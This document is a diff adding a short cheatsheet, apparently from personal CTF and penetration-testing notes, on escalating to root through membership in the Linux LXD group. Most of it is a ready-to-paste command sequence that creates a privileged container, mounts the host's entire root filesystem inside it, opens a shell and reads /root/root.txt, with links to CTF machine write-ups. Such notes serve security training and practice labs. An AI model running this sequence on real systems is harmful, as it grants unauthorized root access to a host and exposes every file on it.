@@ -1,0 +1,52 @@
+---
+title: Cheatsheet - LXD Group
+categories: [Cheatsheet, Linux Privilege Escalation]
+tags: [linux-priv-esc/lxd, cheatsheet/linux]
+---
+
+# LXD
+1. Import [alpine image](https://github.com/saghul/lxd-alpine-builder)
+	```
+	init lxd
+	lxc image import ./alpine.tar.gz --alias privesc
+	```
+2. Initalize/start a container from that image
+	```
+	lxc init privesc privesc-container -c security.privileged=true
+	```
+3. Add a mounted file system to the mnt directory of the container
+	```
+	lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true
+	```
+4. Start container
+	```
+	lxc start privesc-container
+	```
+5. Execute the container and get an interactive shell
+	```
+	lxc exec privesc-container /bin/sh
+	```
+6. Path to /mnt for the entire target file system
+	```
+	cd /mnt 
+	# root dir
+	cd /mnt/root
+	```
+	
+# Paste this
+```
+lxc image import ./alpine.tar.gz --alias privesc
+lxc init privesc privesc-container -c security.privileged=true
+lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true
+lxc start privesc-container
+lxc exec privesc-container /bin/sh
+cat /mnt/root/root/root.txt
+```
+
+# Some Examples:
+- [[Game Zone#Privilege Escalation with LXD group]]
+- [[Anonymous]]
+- [[INFOSEC PREP - OSCP#Privilege Escalation 2 via LXD group]]
+- [[LXD Group]]
+- [[BrainFuck.md#Root - Via LXD]]
+
